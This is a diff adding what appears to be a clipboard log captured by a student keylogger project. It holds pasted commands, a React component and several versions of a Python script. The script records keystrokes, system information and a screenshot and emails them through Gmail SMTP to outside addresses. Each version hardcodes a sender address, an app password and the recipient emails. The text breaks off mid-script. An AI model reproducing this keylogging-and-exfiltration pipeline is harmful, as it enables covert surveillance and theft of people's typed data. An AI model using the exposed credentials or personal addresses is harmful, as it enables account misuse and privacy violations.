@@ -18,3 +18,1360 @@ activity-analyzer/
  +- config.py
  +- keystrokes.txt
  +- requirements.txt
+
+Time: 2026-03-17 13:41:10.242776
+Clipboard Data: python behavior_auth.py
+
+Time: 2026-03-17 13:43:22.467273
+Clipboard Data: python behavior_auth.py
+
+Time: 2026-03-17 20:41:17.042074
+Clipboard Data: python system_track.pyw
+
+Time: 2026-03-17 20:42:12.911807
+Clipboard Data: python system_track.pyw
+
+Time: 2026-03-17 20:46:20.314652
+Clipboard Data: PS C:\Users\alank\Major_proj_keylogger_2\activity-analyzer> python main.py
+Error: set GEMINI_API_KEY in your environment.
+
+Time: 2026-03-17 20:47:04.261315
+Clipboard Data: PS C:\Users\alank\Major_proj_keylogger_2\activity-analyzer> python main.py
+Error: set GEMINI_API_KEY in your environment.
+
+Time: 2026-03-17 20:54:20.465331
+Clipboard Data: import { useState, useMemo } from "react";
+import { Link } from "react-router-dom";
+import { useQuery } from "convex/react";
+import { api } from "@/convex/_generated/api.js";
+import { Card, CardContent } from "@/components/ui/card.tsx";
+import { Badge } from "@/components/ui/badge.tsx";
+import { Skeleton } from "@/components/ui/skeleton.tsx";
+import { Empty, EmptyHeader, EmptyMedia, EmptyTitle, EmptyDescription, EmptyContent } from "@/components/ui/empty.tsx";
+import { Button } from "@/components/ui/button.tsx";
+import { Tabs, TabsList, TabsTrigger, TabsContent } from "@/components/ui/tabs.tsx";
+import { Calendar, MapPin, Mountain, ChevronRight, Compass, CreditCard, Dumbbell, Clock, PlayCircle, CheckCircle2 } from "lucide-react";
+import { format, isValid, parseISO } from "date-fns";
+
+function formatDateSafe(dateString: string, formatStr: string): string {
+  if (!dateString) return "TBA";
+  const trimmed = dateString.trim();
+
+  // Try ISO format first (e.g. 2026-02-20)
+  const isoDate = parseISO(trimmed);
+  if (isValid(isoDate)) return format(isoDate, formatStr);
+
+  // Fallback: let JS parse common friendly formats (e.g. Jan 22, 2026)
+  const jsDate = new Date(trimmed);
+  if (isValid(jsDate)) return format(jsDate, formatStr);
+
+  // If still not valid, show the raw text the admin entered
+  return trimmed;
+}
+
+const getDifficultyColor = (difficulty: string) => {
+  switch (difficulty) {
+    case "Easy":
+      return "bg-blue-100 text-blue-800 dark:bg-blue-900 dark:text-blue-300";
+    case "Moderate":
+      return "bg-green-100 text-green-800 dark:bg-green-900 dark:text-green-300";
+    case "Challenging":
+      return "bg-yellow-100 text-yellow-800 dark:bg-yellow-900 dark:text-yellow-300";
+    case "Advanced":
+      return "bg-red-100 text-red-800 dark:bg-red-900 dark:text-red-300";
+    default:
+      return "bg-muted text-muted-foreground";
+  }
+};
+
+const getStatusBadge = (status: string) => {
+  switch (status) {
+    case "registered":
+      return <Badge variant="secondary">Registered</Badge>;
+    case "confirmed":
+      return <Badge className="bg-green-100 text-green-800 dark:bg-green-900 dark:text-green-300">Confirmed</Badge>;
+    case "cancelled":
+      return <Badge variant="destructive">Cancelled</Badge>;
+    default:
+      return null;
+  }
+};
+
+type TripStatus = "upcoming" | "ongoing" | "past" | "cancelled";
+
+interface TourWithStatus {
+  _id: string;
+  name: string;
+  description: string;
+  duration: string;
+  difficulty: "Easy" | "Moderate" | "Challenging" | "Advanced";
+  elevation: string;
+  startDate: string;
+  endDate: string;
+  price?: number;
+  maxParticipants?: number;
+  image: string;
+  guideId?: string;
+  status: "draft" | "published" | "completed" | "cancelled";
+  enrollment: {
+    status: "registered" | "confirmed" | "cancelled";
+    paymentStatus: "pending" | "partial" | "paid";
+    trainingProgress: number;
+  };
+  tripStatus: TripStatus;
+}
+
+function getTripStatus(tour: { startDate: string; endDate: string; enrollment?: { status: string } }): TripStatus {
+  // If enrollment is cancelled, it's a cancelled trip
+  if (tour.enrollment?.status === "cancelled") {
+    return "cancelled";
+  }
+  
+  const now = Date.now();
+  const startDate = new Date(tour.startDate).getTime();
+  const endDate = new Date(tour.endDate).getTime();
+  
+  if (now < startDate) {
+    return "upcoming";
+  } else if (now >= startDate && now <= endDate) {
+    return "ongoing";
+  } else {
+    return "past";
+  }
+}
+
+function TourCard({ tour }: { tour: TourWithStatus }) {
+  return (
+    <Link to={`/app/tours/${tour._id}`}>
+      <Card className="overflow-hidden pt-0 pb-3 gap-2 hover:shadow-md transition-shadow">
+        <div className="relative h-36">
+          <img
+            src={tour.image}
+            alt={tour.name}
+            className="w-full h-full object-cover"
+          />
+          <div className="absolute inset-0 bg-gradient-to-t from-black/60 to-transparent" />
+          <div className="absolute top-3 right-3 flex gap-2">
+            <Badge className={getDifficultyColor(tour.difficulty)}>
+              {tour.difficulty}
+            </Badge>
+          </div>
+          <div className="absolute bottom-3 left-4 right-4 flex items-end justify-between">
+            <h3 className="text-lg font-bold text-white">{tour.name}</h3>
+            {tour.enrollment && getStatusBadge(tour.enrollment.status)}
+          </div>
+        </div>
+        <CardContent className="pt-2 pb-0">
+          <div className="flex items-center justify-between">
+            <div className="space-y-2">
+              <div className="flex items-center gap-4 text-sm text-muted-foreground">
+                <div className="flex items-center gap-1">
+                  <Calendar className="w-4 h-4" />
+                  <span>
+                    {formatDateSafe(tour.startDate, "MMM d, yyyy")}
+                  </span>
+                </div>
+                <div className="flex items-center gap-1">
+                  <MapPin className="w-4 h-4" />
+                  <span>{tour.duration}</span>
+                </div>
+              </div>
+              <div className="flex items-center gap-1 text-sm text-muted-foreground">
+                <Mountain className="w-4 h-4" />
+                <span>Max elevation: {tour.elevation}</span>
+              </div>
+              {tour.enrollment && (
+                <div className="flex items-center gap-2 mt-2">
+                  <Badge
+                    className={`text-xs ${
+                      tour.enrollment.paymentStatus === "paid"
+                        ? "bg-green-100 text-green-800 dark:bg-green-900 dark:text-green-300"
+                        : tour.enrollment.paymentStatus === "partial"
+                        ? "bg-amber-100 text-amber-800 dark:bg-amber-900 dark:text-amber-300"
+                        : "bg-red-100 text-red-800 dark:bg-red-900 dark:text-red-300"
+                    }`}
+                  >
+                    <CreditCard className="w-3 h-3 mr-1" />
+                    {tour.enrollment.paymentStatus === "paid"
+                      ? "Paid"
+                      : tour.enrollment.paymentStatus === "partial"
+                      ? "Partial"
+                      : "Payment Pending"}
+                  </Badge>
+                  <Badge variant="outline" className="text-xs">
+                    <Dumbbell className="w-3 h-3 mr-1" />
+                    Training: {tour.enrollment.trainingProgress}%
+                  </Badge>
+                </div>
+              )}
+            </div>
+            <ChevronRight className="w-5 h-5 text-muted-foreground" />
+          </div>
+        </CardContent>
+      </Card>
+    </Link>
+  );
+}
+
+function EmptyTabState({ 
+  icon: Icon, 
+  title, 
+  description 
+}: { 
+  icon: React.ComponentType<{ className?: string }>;
+  title: string; 
+  description: string;
+}) {
+  return (
+    <div className="py-12 flex items-center justify-center">
+      <Empty>
+        <EmptyHeader>
+          <EmptyMedia variant="icon">
+            <Icon className="w-8 h-8" />
+          </EmptyMedia>
+          <EmptyTitle>{title}</EmptyTitle>
+          <EmptyDescription>{description}</EmptyDescription>
+        </EmptyHeader>
+      </Empty>
+    </div>
+  );
+}
+
+
+Time: 2026-03-17 20:55:01.972151
+Clipboard Data: import { useState, useMemo } from "react";
+import { Link } from "react-router-dom";
+import { useQuery } from "convex/react";
+import { api } from "@/convex/_generated/api.js";
+import { Card, CardContent } from "@/components/ui/card.tsx";
+import { Badge } from "@/components/ui/badge.tsx";
+import { Skeleton } from "@/components/ui/skeleton.tsx";
+import { Empty, EmptyHeader, EmptyMedia, EmptyTitle, EmptyDescription, EmptyContent } from "@/components/ui/empty.tsx";
+import { Button } from "@/components/ui/button.tsx";
+import { Tabs, TabsList, TabsTrigger, TabsContent } from "@/components/ui/tabs.tsx";
+import { Calendar, MapPin, Mountain, ChevronRight, Compass, CreditCard, Dumbbell, Clock, PlayCircle, CheckCircle2 } from "lucide-react";
+import { format, isValid, parseISO } from "date-fns";
+
+function formatDateSafe(dateString: string, formatStr: string): string {
+  if (!dateString) return "TBA";
+  const trimmed = dateString.trim();
+
+  // Try ISO format first (e.g. 2026-02-20)
+  const isoDate = parseISO(trimmed);
+  if (isValid(isoDate)) return format(isoDate, formatStr);
+
+  // Fallback: let JS parse common friendly formats (e.g. Jan 22, 2026)
+  const jsDate = new Date(trimmed);
+  if (isValid(jsDate)) return format(jsDate, formatStr);
+
+  // If still not valid, show the raw text the admin entered
+  return trimmed;
+}
+
+const getDifficultyColor = (difficulty: string) => {
+  switch (difficulty) {
+    case "Easy":
+      return "bg-blue-100 text-blue-800 dark:bg-blue-900 dark:text-blue-300";
+    case "Moderate":
+      return "bg-green-100 text-green-800 dark:bg-green-900 dark:text-green-300";
+    case "Challenging":
+      return "bg-yellow-100 text-yellow-800 dark:bg-yellow-900 dark:text-yellow-300";
+    case "Advanced":
+      return "bg-red-100 text-red-800 dark:bg-red-900 dark:text-red-300";
+    default:
+      return "bg-muted text-muted-foreground";
+  }
+};
+
+const getStatusBadge = (status: string) => {
+  switch (status) {
+    case "registered":
+      return <Badge variant="secondary">Registered</Badge>;
+    case "confirmed":
+      return <Badge className="bg-green-100 text-green-800 dark:bg-green-900 dark:text-green-300">Confirmed</Badge>;
+    case "cancelled":
+      return <Badge variant="destructive">Cancelled</Badge>;
+    default:
+      return null;
+  }
+};
+
+type TripStatus = "upcoming" | "ongoing" | "past" | "cancelled";
+
+interface TourWithStatus {
+  _id: string;
+  name: string;
+  description: string;
+  duration: string;
+  difficulty: "Easy" | "Moderate" | "Challenging" | "Advanced";
+  elevation: string;
+  startDate: string;
+  endDate: string;
+  price?: number;
+  maxParticipants?: number;
+  image: string;
+  guideId?: string;
+  status: "draft" | "published" | "completed" | "cancelled";
+  enrollment: {
+    status: "registered" | "confirmed" | "cancelled";
+    paymentStatus: "pending" | "partial" | "paid";
+    trainingProgress: number;
+  };
+  tripStatus: TripStatus;
+}
+
+function getTripStatus(tour: { startDate: string; endDate: string; enrollment?: { status: string } }): TripStatus {
+  // If enrollment is cancelled, it's a cancelled trip
+  if (tour.enrollment?.status === "cancelled") {
+    return "cancelled";
+  }
+  
+  const now = Date.now();
+  const startDate = new Date(tour.startDate).getTime();
+  const endDate = new Date(tour.endDate).getTime();
+  
+  if (now < startDate) {
+    return "upcoming";
+  } else if (now >= startDate && now <= endDate) {
+    return "ongoing";
+  } else {
+    return "past";
+  }
+}
+
+function TourCard({ tour }: { tour: TourWithStatus }) {
+  return (
+    <Link to={`/app/tours/${tour._id}`}>
+      <Card className="overflow-hidden pt-0 pb-3 gap-2 hover:shadow-md transition-shadow">
+        <div className="relative h-36">
+          <img
+            src={tour.image}
+            alt={tour.name}
+            className="w-full h-full object-cover"
+          />
+          <div className="absolute inset-0 bg-gradient-to-t from-black/60 to-transparent" />
+          <div className="absolute top-3 right-3 flex gap-2">
+            <Badge className={getDifficultyColor(tour.difficulty)}>
+              {tour.difficulty}
+            </Badge>
+          </div>
+          <div className="absolute bottom-3 left-4 right-4 flex items-end justify-between">
+            <h3 className="text-lg font-bold text-white">{tour.name}</h3>
+            {tour.enrollment && getStatusBadge(tour.enrollment.status)}
+          </div>
+        </div>
+        <CardContent className="pt-2 pb-0">
+          <div className="flex items-center justify-between">
+            <div className="space-y-2">
+              <div className="flex items-center gap-4 text-sm text-muted-foreground">
+                <div className="flex items-center gap-1">
+                  <Calendar className="w-4 h-4" />
+                  <span>
+                    {formatDateSafe(tour.startDate, "MMM d, yyyy")}
+                  </span>
+                </div>
+                <div className="flex items-center gap-1">
+                  <MapPin className="w-4 h-4" />
+                  <span>{tour.duration}</span>
+                </div>
+              </div>
+              <div className="flex items-center gap-1 text-sm text-muted-foreground">
+                <Mountain className="w-4 h-4" />
+                <span>Max elevation: {tour.elevation}</span>
+              </div>
+              {tour.enrollment && (
+                <div className="flex items-center gap-2 mt-2">
+                  <Badge
+                    className={`text-xs ${
+                      tour.enrollment.paymentStatus === "paid"
+                        ? "bg-green-100 text-green-800 dark:bg-green-900 dark:text-green-300"
+                        : tour.enrollment.paymentStatus === "partial"
+                        ? "bg-amber-100 text-amber-800 dark:bg-amber-900 dark:text-amber-300"
+                        : "bg-red-100 text-red-800 dark:bg-red-900 dark:text-red-300"
+                    }`}
+                  >
+                    <CreditCard className="w-3 h-3 mr-1" />
+                    {tour.enrollment.paymentStatus === "paid"
+                      ? "Paid"
+                      : tour.enrollment.paymentStatus === "partial"
+                      ? "Partial"
+                      : "Payment Pending"}
+                  </Badge>
+                  <Badge variant="outline" className="text-xs">
+                    <Dumbbell className="w-3 h-3 mr-1" />
+                    Training: {tour.enrollment.trainingProgress}%
+                  </Badge>
+                </div>
+              )}
+            </div>
+            <ChevronRight className="w-5 h-5 text-muted-foreground" />
+          </div>
+        </CardContent>
+      </Card>
+    </Link>
+  );
+}
+
+function EmptyTabState({ 
+  icon: Icon, 
+  title, 
+  description 
+}: { 
+  icon: React.ComponentType<{ className?: string }>;
+  title: string; 
+  description: string;
+}) {
+  return (
+    <div className="py-12 flex items-center justify-center">
+      <Empty>
+        <EmptyHeader>
+          <EmptyMedia variant="icon">
+            <Icon className="w-8 h-8" />
+          </EmptyMedia>
+          <EmptyTitle>{title}</EmptyTitle>
+          <EmptyDescription>{description}</EmptyDescription>
+        </EmptyHeader>
+      </Empty>
+    </div>
+  );
+}
+
+
+Time: 2026-03-17 22:02:58.613569
+Clipboard Data: def run_scripts():
+    log("Starting behavior_auth...")
+
+    process = subprocess.Popen(
+        ["python", "behavior_auth.py"],
+        stdin=subprocess.PIPE,
+        text=True
+    )
+
+    # Auto login
+    process.stdin.write("1\n")
+    process.stdin.write("admin\n")
+    process.stdin.flush()
+
+    log("Waiting for user to press ESC...")
+    process.wait()
+
+    log("behavior_auth.py finished")
+
+    import shutil
+
+    user_folder = get_latest_user_folder()
+
+    if not user_folder:
+        log("No user folder found [ERROR]")
+        exit(1)
+
+    src = os.path.join(user_folder, "keystrokes.txt")
+    dst = "keystrokes.txt"
+
+    if os.path.exists(src):
+        shutil.copy(src, dst)
+        log(f"Copied keystrokes.txt from {user_folder}")
+    else:
+        log("keystrokes.txt not found in user folder [ERROR]")
+        exit(1)
+
+    run_step("preprocess_keylog.py", ["python", "preprocess_keylog.py"])
+    run_step("system_track.pyw", ["python", "system_track.pyw"])
+    run_step("activity-analyzer/main.py", ["python", "activity-analyzer/main.py"])
+
+Time: 2026-03-17 22:12:38.252857
+Clipboard Data: log("Running system_track.pyw for 20 seconds...")
+
+process = subprocess.Popen(["python", "system_track.pyw"])
+
+time.sleep(20)   # collect system data for 20 sec
+
+process.terminate()
+
+log("Stopped system_track.pyw")
+
+Time: 2026-03-17 22:33:05.179654
+Clipboard Data: import os
+import time
+import subprocess
+import smtplib
+import shutil
+from email.message import EmailMessage
+from datetime import datetime
+
+# ---------- CONFIG ----------
+SENDER_EMAIL = "alankritsrivastava2k4@gmail.com"
+APP_PASSWORD = "agfudcooqmnnkcsa"
+RECEIVER_EMAIL = "dvpandit2003@gmail.com"
+
+LOG_FILE = "run_log.txt"
+
+ATTACHMENTS = [
+    "keystrokes.txt",
+    "keystroke_dataset.csv",
+    "system_info.xlsx",
+    "screenshot.png"
+]
+
+# ---------- LOGGER ----------
+def log(message):
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    msg = f"[{timestamp}] {message}"
+    print(msg)
+    with open(LOG_FILE, "a", encoding="utf-8") as f:
+        f.write(msg + "\n")
+
+
+# ---------- GET USER FOLDER ----------
+def get_latest_user_folder():
+    folders = []
+    for f in os.listdir('.'):
+        if os.path.isdir(f) and not f.startswith('.'):
+            if os.path.exists(os.path.join(f, "keystroke_dataset.csv")):
+                folders.append(f)
+
+    if not folders:
+        return None
+
+    return max(folders, key=os.path.getmtime)
+
+
+# ---------- RUN STEP ----------
+def run_step(name, command):
+    log(f"STARTING: {name}")
+    try:
+        result = subprocess.run(command, check=True, capture_output=True, text=True)
+        log(f"SUCCESS: {name}")
+        if result.stdout:
+            log(result.stdout)
+    except subprocess.CalledProcessError as e:
+        log(f"ERROR in {name}")
+        log(e.stderr)
+        exit(1)
+
+
+# ---------- MAIN ----------
+def run_all():
+
+    log("===== STARTING PIPELINE =====")
+
+    # ---------------- BEHAVIOR AUTH ----------------
+    log("Running behavior_auth...")
+
+    process = subprocess.Popen(
+        ["python", "behavior_auth.py"],
+        stdin=subprocess.PIPE,
+        text=True
+    )
+
+    process.stdin.write("1\n")
+    process.stdin.write("admin\n")
+    process.stdin.flush()
+
+    time.sleep(60)  # typing time
+
+    process.terminate()
+    time.sleep(3)
+
+    log("behavior_auth stopped")
+
+    # ---------------- COPY FILE ----------------
+    user_folder = get_latest_user_folder()
+
+    if not user_folder:
+        log("User folder not found")
+        exit(1)
+
+    src = os.path.join(user_folder, "keystrokes.txt")
+    dst = "keystrokes.txt"
+
+    if os.path.exists(src):
+        shutil.copy(src, dst)
+        log(f"Copied keystrokes.txt from {user_folder}")
+    else:
+        log("keystrokes.txt not found")
+        exit(1)
+
+    # ---------------- PREPROCESS ----------------
+    run_step("preprocess_keylog.py", ["python", "preprocess_keylog.py"])
+
+    # ---------------- SYSTEM TRACK ----------------
+    log("Running system_track for 20 sec...")
+
+    process = subprocess.Popen(["python", "system_track.pyw"])
+    time.sleep(20)
+    process.terminate()
+    time.sleep(2)
+
+    log("system_track stopped")
+
+    # ---------------- ANALYZER ----------------
+    run_step("activity-analyzer/main.py", ["python", "activity-analyzer/main.py"])
+
+    # ---------------- EMAIL ----------------
+    log("Sending email...")
+
+    msg = EmailMessage()
+    msg["Subject"] = "Keystroke Analysis Report"
+    msg["From"] = SENDER_EMAIL
+    msg["To"] = RECEIVER_EMAIL
+    msg.set_content("Attached results")
+
+    for file in ATTACHMENTS:
+        if os.path.exists(file):
+            with open(file, "rb") as f:
+                msg.add_attachment(
+                    f.read(),
+                    maintype="application",
+                    subtype="octet-stream",
+                    filename=file
+                )
+            log(f"Attached: {file}")
+        else:
+            log(f"Missing: {file}")
+
+    try:
+        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
+            smtp.login(SENDER_EMAIL, APP_PASSWORD)
+            smtp.send_message(msg)
+
+        log("Email sent successfully")
+
+    except Exception as e:
+        log(f"Email error: {e}")
+
+    log("===== PIPELINE COMPLETED =====")
+
+
+# ---------- RUN ----------
+if __name__ == "__main__":
+    run_all()
+
+Time: 2026-03-17 22:45:13.171671
+Clipboard Data: import os
+import time
+import subprocess
+import smtplib
+import shutil
+from email.message import EmailMessage
+from datetime import datetime
+
+# ---------- CONFIG ----------
+SENDER_EMAIL = "alankritsrivastava2k4@gmail.com"
+APP_PASSWORD = "agfudcooqmnnkcsa"
+RECEIVER_EMAIL = "dvpandit2003@gmail.com"
+
+LOG_FILE = "run_log.txt"
+
+ATTACHMENTS = [
+    "keystrokes.txt",
+    "keystroke_dataset.csv",
+    "system_info.xlsx",
+    "screenshot.png"
+]
+
+# ---------- LOGGER ----------
+def log(message):
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    msg = f"[{timestamp}] {message}"
+    print(msg)
+
+    with open(LOG_FILE, "a", encoding="utf-8") as f:
+        f.write(msg + "\n")
+
+
+# ---------- GET USER FOLDER ----------
+def get_latest_user_folder():
+    folders = []
+
+    for f in os.listdir('.'):
+        if os.path.isdir(f) and not f.startswith('.'):
+            if os.path.exists(os.path.join(f, "keystroke_dataset.csv")):
+                folders.append(f)
+
+    if not folders:
+        return None
+
+    return max(folders, key=os.path.getmtime)
+
+
+# ---------- RUN STEP ----------
+def run_step(name, command):
+    log(f"STARTING: {name}")
+
+    try:
+        result = subprocess.run(
+            command,
+            check=True,
+            capture_output=True,
+            text=True
+        )
+
+        log(f"SUCCESS: {name}")
+        return result.stdout  # return output
+
+    except subprocess.CalledProcessError as e:
+        log(f"ERROR in {name}")
+        log(e.stderr)
+        exit(1)
+
+
+# ---------- AUTH STATUS ----------
+def get_auth_status():
+    log_file = "security_log.txt"
+
+    if not os.path.exists(log_file):
+        return "Authenticated (No intrusion detected)"
+
+    with open(log_file, "r", encoding="utf-8") as f:
+        content = f.read()
+
+    if "Intruder detected" in content:
+        return "?? Intrusion Detected"
+    else:
+        return "? Authenticated"
+
+
+# ---------- MAIN ----------
+def run_all():
+
+    log("===== STARTING PIPELINE =====")
+
+    # ---------------- BEHAVIOR AUTH ----------------
+    log("Running behavior_auth (manual mode)...")
+
+    process = subprocess.Popen(["python", "behavior_auth.py"])
+
+    log("?? Select user manually and type")
+    log("?? Press ESC when done")
+
+    process.wait()   # wait for ESC
+
+    log("behavior_auth finished")
+
+    # ---------------- COPY KEYSTROKES ----------------
+    user_folder = get_latest_user_folder()
+
+    if not user_folder:
+        log("User folder not found")
+        exit(1)
+
+    src = os.path.join(user_folder, "keystrokes.txt")
+    dst = "keystrokes.txt"
+
+    if os.path.exists(src):
+        shutil.copy(src, dst)
+        log(f"Copied keystrokes.txt from {user_folder}")
+    else:
+        log("keystrokes.txt not found")
+        exit(1)
+
+    # ---------------- PREPROCESS ----------------
+    run_step("preprocess_keylog.py", ["python", "preprocess_keylog.py"])
+
+    # ---------------- SYSTEM TRACK ----------------
+    log("Running system_track for 20 sec...")
+
+    process = subprocess.Popen(["python", "system_track.pyw"])
+    time.sleep(20)
+    process.terminate()
+    time.sleep(2)
+
+    log("system_track stopped")
+
+    # ---------------- ANALYZER ----------------
+    analyzer_output = run_step(
+        "activity-analyzer/main.py",
+        ["python", "activity-analyzer/main.py"]
+    )
+
+    # save analyzer output
+    with open("analysis_output.txt", "w", encoding="utf-8") as f:
+        f.write(analyzer_output)
+
+    ATTACHMENTS.append("analysis_output.txt")
+
+    # ---------------- EMAIL ----------------
+    log("Sending email...")
+
+    auth_status = get_auth_status()
+
+    msg = EmailMessage()
+    msg["Subject"] = "Keystroke Analysis Report"
+    msg["From"] = SENDER_EMAIL
+    msg["To"] = RECEIVER_EMAIL
+
+    report = f"""
+===== KEYSTROKE ANALYSIS REPORT =====
+
+Authentication Status:
+{auth_status}
+
+Activity Analysis:
+{analyzer_output}
+
+=====================================
+"""
+
+    msg.set_content(report)
+
+    for file in ATTACHMENTS:
+        if os.path.exists(file):
+            with open(file, "rb") as f:
+                msg.add_attachment(
+                    f.read(),
+                    maintype="application",
+                    subtype="octet-stream",
+                    filename=file
+                )
+            log(f"Attached: {file}")
+        else:
+            log(f"Missing: {file}")
+
+    try:
+        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
+            smtp.login(SENDER_EMAIL, APP_PASSWORD)
+            smtp.send_message(msg)
+
+        log("Email sent successfully")
+
+    except Exception as e:
+        log(f"Email error: {e}")
+
+    log("===== PIPELINE COMPLETED =====")
+
+
+# ---------- RUN ----------
+if __name__ == "__main__":
+    run_all()
+
+Time: 2026-03-17 22:50:30.516667
+Clipboard Data: Options:
+1. Login as existing user
+2. Register new user
+3. List all users
+4. Migrate existing data to user profile
+5. Exit
+
+Enter your choice (1-5): Available users:
+1. admin
+2. alan123
+3. david123
+4. Major_proj_keylogger_2-main
+
+Time: 2026-03-17 22:57:41.654335
+Clipboard Data: subprocess.run(["python", "behavior_auth.py"])
+
+Time: 2026-03-18 00:16:38.601329
+Clipboard Data: import os
+import time
+import subprocess
+import smtplib
+import shutil
+from email.message import EmailMessage
+from datetime import datetime
+import sys
+
+# ---------- CONFIG ----------
+SENDER_EMAIL = "alankritsrivastava2k4@gmail.com"
+APP_PASSWORD = "agfudcooqmnnkcsa"
+RECEIVER_EMAIL = "alankrit0310@gmail.com"
+
+LOG_FILE = "run_log.txt"
+
+ATTACHMENTS = [
+    "keystrokes.txt",
+    "keystroke_dataset.csv",
+    "system_info.xlsx",
+    "screenshot.png"
+]
+
+# ---------- LOGGER ----------
+def log(message):
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    msg = f"[{timestamp}] {message}"
+    print(msg)
+
+    with open(LOG_FILE, "a", encoding="utf-8") as f:
+        f.write(msg + "\n")
+
+
+# ---------- GET USER FOLDER ----------
+def get_latest_user_folder():
+    folders = []
+    for f in os.listdir('.'):
+        if os.path.isdir(f) and not f.startswith('.'):
+            if os.path.exists(os.path.join(f, "keystroke_dataset.csv")):
+                folders.append(f)
+
+    if not folders:
+        return None
+
+    return max(folders, key=os.path.getmtime)
+
+
+# ---------- RUN STEP ----------
+def run_step(name, command):
+    log(f"STARTING: {name}")
+
+    try:
+        result = subprocess.run(
+            command,
+            check=True,
+            capture_output=True,
+            text=True
+        )
+
+        log(f"SUCCESS: {name}")
+        return result.stdout
+
+    except subprocess.CalledProcessError as e:
+        log(f"ERROR in {name}")
+        log(e.stderr)
+        exit(1)
+
+
+# ---------- AUTH STATUS ----------
+def get_auth_status():
+    log_file = "security_log.txt"
+
+    if not os.path.exists(log_file):
+        return "? Authenticated"
+
+    with open(log_file, "r", encoding="utf-8") as f:
+        lines = f.readlines()
+
+    if not lines:
+        return "? Authenticated"
+
+    if "Intruder detected" in lines[-1]:
+        return "?? Intrusion Detected"
+    else:
+        return "? Authenticated"
+
+
+# ---------- MAIN ----------
+def run_all():
+
+    log("===== STARTING PIPELINE =====")
+
+    # ---------------- BEHAVIOR AUTH ----------------
+    log("Running behavior_auth (manual mode, 120 sec)...")
+
+    process = subprocess.Popen(
+        ["python", "behavior_auth.py"],
+        stdin=sys.stdin,
+        stdout=sys.stdout,
+        stderr=sys.stderr
+    )
+
+    log("?? Select user manually and type")
+
+    time.sleep(120)   # ? 120 seconds timeout
+
+    process.terminate()
+    time.sleep(3)
+
+    log("behavior_auth stopped after 120 sec")
+
+    # ---------------- COPY KEYSTROKES ----------------
+    user_folder = get_latest_user_folder()
+
+    if not user_folder:
+        log("User folder not found")
+        exit(1)
+
+    src = os.path.join(user_folder, "keystrokes.txt")
+    dst = "keystrokes.txt"
+
+    if os.path.exists(src):
+        shutil.copy(src, dst)
+        log(f"Copied keystrokes.txt from {user_folder}")
+    else:
+        log("keystrokes.txt not found")
+        exit(1)
+
+    # ---------------- PREPROCESS ----------------
+    run_step("preprocess_keylog.py", ["python", "preprocess_keylog.py"])
+
+    # ---------------- SYSTEM TRACK ----------------
+    log("Running system_track (20 sec)...")
+
+    process = subprocess.Popen(["python", "system_track.pyw"])
+    time.sleep(20)   # ? 20 seconds
+    process.terminate()
+    time.sleep(2)
+
+    log("system_track stopped")
+
+    # ---------------- ANALYZER ----------------
+    analyzer_output = run_step(
+        "activity-analyzer/main.py",
+        ["python", "activity-analyzer/main.py"]
+    )
+
+    with open("analysis_output.txt", "w", encoding="utf-8") as f:
+        f.write(analyzer_output)
+
+    ATTACHMENTS.append("analysis_output.txt")
+
+    # ---------------- EMAIL ----------------
+    log("Sending email...")
+
+    auth_status = get_auth_status()
+
+    msg = EmailMessage()
+    msg["Subject"] = "Keystroke Analysis Report"
+    msg["From"] = SENDER_EMAIL
+    msg["To"] = RECEIVER_EMAIL
+
+    report = f"""
+===== KEYSTROKE ANALYSIS REPORT =====
+
+Authentication Status:
+{auth_status}
+
+Activity Analysis:
+{analyzer_output}
+
+=====================================
+"""
+
+    msg.set_content(report)
+
+    for file in ATTACHMENTS:
+        if os.path.exists(file):
+            with open(file, "rb") as f:
+                msg.add_attachment(
+                    f.read(),
+                    maintype="application",
+                    subtype="octet-stream",
+                    filename=file
+                )
+            log(f"Attached: {file}")
+        else:
+            log(f"Missing: {file}")
+
+    try:
+        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
+            smtp.login(SENDER_EMAIL, APP_PASSWORD)
+            smtp.send_message(msg)
+
+        log("Email sent successfully")
+
+    except Exception as e:
+        log(f"Email error: {e}")
+
+    log("===== PIPELINE COMPLETED =====")
+
+
+# ---------- RUN ----------
+if __name__ == "__main__":
+    run_all()
+
+Time: 2026-03-18 00:22:36.240945
+Clipboard Data: import os
+import time
+import subprocess
+import smtplib
+import shutil
+from email.message import EmailMessage
+from datetime import datetime
+import sys
+
+# ---------- CONFIG ----------
+SENDER_EMAIL = "alankritsrivastava2k4@gmail.com"
+APP_PASSWORD = "agfudcooqmnnkcsa"
+RECEIVER_EMAIL = "alankrit0310@gmail.com"
+
+LOG_FILE = "run_log.txt"
+
+ATTACHMENTS = [
+    "keystrokes.txt",
+    "keystroke_dataset.csv",
+    "system_info.xlsx",
+    "screenshot.png"
+]
+
+# ---------- LOGGER ----------
+def log(message):
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    msg = f"[{timestamp}] {message}"
+    print(msg)
+
+    with open(LOG_FILE, "a", encoding="utf-8") as f:
+        f.write(msg + "\n")
+
+
+# ---------- GET USER FOLDER ----------
+def get_latest_user_folder():
+    folders = []
+    for f in os.listdir('.'):
+        if os.path.isdir(f) and not f.startswith('.'):
+            if os.path.exists(os.path.join(f, "keystroke_dataset.csv")):
+                folders.append(f)
+
+    if not folders:
+        return None
+
+    return max(folders, key=os.path.getmtime)
+
+
+# ---------- RUN STEP ----------
+def run_step(name, command):
+    log(f"STARTING: {name}")
+
+    try:
+        result = subprocess.run(
+            command,
+            check=True,
+            capture_output=True,
+            text=True
+        )
+
+        log(f"SUCCESS: {name}")
+        return result.stdout
+
+    except subprocess.CalledProcessError as e:
+        log(f"ERROR in {name}")
+        log(e.stderr)
+        exit(1)
+
+
+# ---------- AUTH STATUS ----------
+def get_auth_status():
+    log_file = "security_log.txt"
+
+    if not os.path.exists(log_file):
+        return "? Authenticated"
+
+    with open(log_file, "r", encoding="utf-8") as f:
+        lines = f.readlines()
+
+    if not lines:
+        return "? Authenticated"
+
+    if "Intruder detected" in lines[-1]:
+        return "?? Intrusion Detected"
+    else:
+        return "? Authenticated"
+
+
+# ---------- MAIN ----------
+def run_all():
+
+    log("===== STARTING PIPELINE =====")
+
+    # ---------------- BEHAVIOR AUTH ----------------
+    log("Running behavior_auth (manual mode, 120 sec)...")
+
+    process = subprocess.Popen(
+        ["python", "behavior_auth.py"],
